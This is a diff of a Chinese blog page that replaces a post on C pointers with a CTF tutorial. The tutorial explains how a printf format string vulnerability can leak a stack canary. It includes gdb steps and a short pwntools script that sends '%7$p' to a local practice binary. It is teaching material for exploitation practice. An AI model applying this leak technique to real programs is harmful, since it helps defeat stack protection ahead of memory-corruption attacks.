@@ -6,21 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>C语言指针学习 | Detective_LFY&#39;s Blog</title>
+  <title>浅谈利用格式化字符串漏洞泄露canary | Detective_LFY&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="1.何为指针指针是一类特殊的变量，用以寄存其他变量的地址。我们知道，假若定义一个变量，则这个变量会被随机分配到内存中的几个连续存储单元。每一个存储单元都有一个地址。正因为这些存储单元是一定的，且每种类型的变量长度是固定的，所以只要知道了这些连续存储单元中的第一个的地址，即知道了这个变量在内存中的位置。因此，这几个连续存储单元的首地址就作为这个变量的地址。例如：定义变量“float f;”，假如它被">
+  <meta name="description" content="0.格式化字符串漏洞0-1.起因我们知道，一般情况下，在C语言中格式化输出函数printf()的用法如下： 123printf(&quot;%d&quot;,a);printf(&quot;%d%f&quot;,a,b);printf(&quot;%d%f%c&quot;,a,b,c);">
 <meta property="og:type" content="article">
-<meta property="og:title" content="C语言指针学习">
-<meta property="og:url" content="http://example.com/2021/09/21/C%E8%AF%AD%E8%A8%80%E6%8C%87%E9%92%88%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:title" content="浅谈利用格式化字符串漏洞泄露canary">
+<meta property="og:url" content="http://example.com/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/index.html">
 <meta property="og:site_name" content="Detective_LFY&#39;s Blog">
-<meta property="og:description" content="1.何为指针指针是一类特殊的变量，用以寄存其他变量的地址。我们知道，假若定义一个变量，则这个变量会被随机分配到内存中的几个连续存储单元。每一个存储单元都有一个地址。正因为这些存储单元是一定的，且每种类型的变量长度是固定的，所以只要知道了这些连续存储单元中的第一个的地址，即知道了这个变量在内存中的位置。因此，这几个连续存储单元的首地址就作为这个变量的地址。例如：定义变量“float f;”，假如它被">
+<meta property="og:description" content="0.格式化字符串漏洞0-1.起因我们知道，一般情况下，在C语言中格式化输出函数printf()的用法如下： 123printf(&quot;%d&quot;,a);printf(&quot;%d%f&quot;,a,b);printf(&quot;%d%f%c&quot;,a,b,c);">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-09-21T14:37:38.000Z">
-<meta property="article:modified_time" content="2021-09-23T02:46:46.410Z">
+<meta property="og:image" content="http://example.com/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/1.png">
+<meta property="og:image" content="http://example.com/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/2.png">
+<meta property="og:image" content="http://example.com/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/3.png">
+<meta property="og:image" content="http://example.com/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/4.png">
+<meta property="og:image" content="http://example.com/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/5.png">
+<meta property="article:published_time" content="2021-10-31T15:26:30.000Z">
+<meta property="article:modified_time" content="2021-11-01T12:28:22.105Z">
 <meta property="article:author" content="LianFeiyang">
-<meta property="article:tag" content="博客">
-<meta property="article:tag" content="C&#x2F;C++">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="格式化字符串漏洞">
+<meta property="article:tag" content="canary">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Detective_LFY&#39;s Blog" type="application/atom+xml">
   
@@ -157,47 +164,38 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-C语言指针学习" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-浅谈利用格式化字符串漏洞泄露canary" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      C语言指针学习
+      浅谈利用格式化字符串漏洞泄露canary
     </h1>
   
 
         
-        <a href="/2021/09/21/C%E8%AF%AD%E8%A8%80%E6%8C%87%E9%92%88%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2021-09-21T14:37:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-21</time>
+        <a href="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/" class="archive-article-date">
+  	<time datetime="2021-10-31T15:26:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-31</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h4 id="1-何为指针"><a href="#1-何为指针" class="headerlink" title="1.何为指针"></a>1.何为指针</h4><p>指针是一类特殊的变量，用以寄存其他变量的地址。<br>我们知道，假若定义一个变量，则这个变量会被随机分配到内存中的几个连续存储单元。每一个存储单元都有一个地址。正因为这些存储单元是一定的，且每种类型的变量长度是固定的，所以只要知道了这些连续存储单元中的第一个的地址，即知道了这个变量在内存中的位置。因此，这几个连续存储单元的首地址就作为这个变量的地址。例如：定义变量“float f;”，假如它被分配到地址为1000、1001、1002、1003的四个连续存储单元，则地址1000就是变量f的地址。而这个地址也成为变量f的指针。<br>因此，<strong>变量的地址就是变量的指针。</strong></p>
-<h4 id="2-指针变量的定义与赋值"><a href="#2-指针变量的定义与赋值" class="headerlink" title="2.指针变量的定义与赋值"></a>2.指针变量的定义与赋值</h4><span id="more"></span>
-<p>指针变量的定义的语法格式如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类型标识符 *标识符;</span><br></pre></td></tr></table></figure>
-<p>指针变量可以通过地址运算符“&amp;”来赋值，例如：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">float</span> f,*p;    <span class="comment">//定义一个单精度浮点型变量f，以及一个指针p。注意，变量与指针的类型必须一致。</span></span><br><span class="line">p=&amp;f;    <span class="comment">//将变量f的地址传给指针p。</span></span><br></pre></td></tr></table></figure>
-<p>指针变量的初始化语句一般写成：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">float</span> f,*p=&amp;f;</span><br></pre></td></tr></table></figure>
-<p>也可以把一个指针的地址值赋值给另一个指针，例如：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i,*p1,*p2;</span><br><span class="line">p1=&amp;i;</span><br><span class="line">p2=p1;    <span class="comment">//赋值完后p1，p2指向同一地址。（即变量i的地址）注意，执行该操作时要求两指针类型相同。</span></span><br></pre></td></tr></table></figure>
-<p>也可以给一个指针赋空值，；例如：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="literal">NULL</span>;  <span class="comment">//注意，NULL被预定义在头文件stdio.h中。</span></span><br></pre></td></tr></table></figure>
-<p>在头文件stdio.h中NULL与整数0对应。被赋予这样值的指针p称为空指针，它不指向任何有效的数据。因此<strong>为了防止错误地使用指针来存取数据，常在指针未被使用前赋值NULL。</strong>NULL可以赋值给<strong>任何类型</strong>的指针。</p>
-<p>我们可以用new、delete运算符来创建一个对象并开分配存储空间或者删除所创建的对象并释放所分配的存储空间。它们的语法格式如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> 类型名; || <span class="keyword">new</span> 类型名[元素个数];</span><br><span class="line"><span class="keyword">delete</span> 变量名; || <span class="keyword">delete</span> []变量名;</span><br></pre></td></tr></table></figure>
-<p>来看一段书上的例子：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i=<span class="number">7</span>,*p;</span><br><span class="line"><span class="keyword">double</span> *q;</span><br><span class="line">p=<span class="keyword">new</span> <span class="keyword">int</span>[i+<span class="number">3</span>];</span><br><span class="line">q=<span class="keyword">new</span> <span class="keyword">double</span>;</span><br><span class="line"><span class="comment">//中间略</span></span><br><span class="line"><span class="keyword">delete</span> q;</span><br><span class="line"><span class="keyword">delete</span> []p;</span><br></pre></td></tr></table></figure>
-<p>这个例子可以方便理解两个运算符的用法。</p>
-<h4 id="3-关于指针运算符的那些事"><a href="#3-关于指针运算符的那些事" class="headerlink" title="3.关于指针运算符的那些事"></a>3.关于指针运算符的那些事</h4><p>指针运算符“*”是单目运算符，运算对象必须放在其右侧，且运算对象只能是指针变量或地址，可以用其来存取相应的存储单元中的数据。<br>有以下的结论：<br><strong>1）*&amp;i &lt;=&gt; i；<br>2）若“p=&amp;i”，则 *p &lt;=&gt; i；</strong><br>但是，两者的时间复杂度不同。利用*p存取其所指变量的值是间接存取的，所以比直接存取一个变量要费时。<br>“&amp;”与“*”放在一起作用时有相互“抵消”的作用。<del>（书上是这样写的……）</del><br>只要指针变量指向了内存中的某一存储单元，就可以用例如*p的形式来存取该存储单元的数据。<br>还是书上的例子（改了一个值），：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line">p=<span class="keyword">new</span> <span class="keyword">int</span>;</span><br><span class="line">*p=<span class="number">4869</span>;</span><br></pre></td></tr></table></figure>
-<p>上述语句中在动态内存存储区中分配了一块存储区域，并将其首地址赋值与指针p，并将整数4869存入该存储区。</p>
+        <h4 id="0-格式化字符串漏洞"><a href="#0-格式化字符串漏洞" class="headerlink" title="0.格式化字符串漏洞"></a>0.格式化字符串漏洞</h4><h5 id="0-1-起因"><a href="#0-1-起因" class="headerlink" title="0-1.起因"></a>0-1.起因</h5><p>我们知道，一般情况下，在C语言中格式化输出函数printf()的用法如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d%f&quot;</span>,a,b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d%f%c&quot;</span>,a,b,c);</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>可以发现，对于printf()这种函数而言，它的<strong>参数数量是不定的</strong>。而对于可变参数的函数而言，如printf()，它本身并不知道需要传入的参数的数量，也不清楚在该函数调用前有多少参数被压栈。因此，它需要传入一个format来告诉它究竟有多少参数被传入。因此，<strong>有几个格式化字符串，函数就认为传入了几个参数。</strong><br>那么，如果没有format会发生什么呢？<br>例如：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(a);</span><br></pre></td></tr></table></figure>
+<p>答案是如果a是个正常的数据，那么程序也会正常输出a的值。<br>那么假如我们稍加利用，<strong>传入一个格式化字符串</strong>又会发生什么呢？<br>那么则有可能会<strong>泄露出内存中的一些数据。</strong></p>
+<h5 id="0-2-泄露任意参数"><a href="#0-2-泄露任意参数" class="headerlink" title="0-2.泄露任意参数"></a>0-2.泄露任意参数</h5><p>假如我们知道在函数调用的过程中某参数是第k个传入的，那么要输出该参数的值，则可利用如下方式：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%k$p&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>按照这种道理，假如我们知道了canary在函数中的是第几个被传入的，则可以通过上述方法泄露canary。</p>
+<h4 id="1-例子"><a href="#1-例子" class="headerlink" title="1.例子"></a>1.例子</h4><p>本题用到的ELF：<a href=".bc">点击下载</a><br>查看IDA：<br><img src="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/1.png"><br>发现明显的格式化字符串漏洞。利用此处泄露canary。<br>用gdb进行动态调试，在func_a()处下断点：<br><img src="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/2.png"><br>按r运行，再按n直到运行到call read处：<br><img src="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/3.png"><br>输入canary查看其值，再输入stack查看栈。<br><img src="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/4.png"><br>可以看出在栈中偏移量为0008、0024、0056处都存有canary的值。这里考虑泄露0008处。<br>我们知道，64位Linux中函数前6个参数靠寄存器传值，之后的参数才会压入栈中。因此我们需要泄露的是第6+8/8=7个参数。<br>因此exp可以这样写：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./bc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;canary &#x27; s @ # $ % ^ &amp; * :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;%7$p&#x27;</span>)</span><br><span class="line">Canary=<span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;00&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(Canary))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>执行完的效果如下图：<br><img src="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/5.png"><br>可以看出成功泄露了canary。</p>
 
       
 
@@ -232,11 +230,15 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">博客</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">C/C++</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">格式化字符串漏洞</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">canary</a>
         		</li>
       		
 		</ul>
@@ -303,7 +305,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/09/21/C%E8%AF%AD%E8%A8%80%E6%8C%87%E9%92%88%E5%AD%A6%E4%B9%A0/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -317,18 +319,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/09/22/Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BB%A3%E7%A0%81%E7%9A%84%E4%B9%A6%E5%86%99%E5%8F%8A%E8%BF%90%E8%A1%8C/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Linux环境下代码的书写及运行
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/09/20/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">测试文章</div>
+    <a href="/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">NSSCTF中收录的【2021 鹤城杯】babyof题解</div>
       <i class="icon-circle-right"></i>
     </a>
   
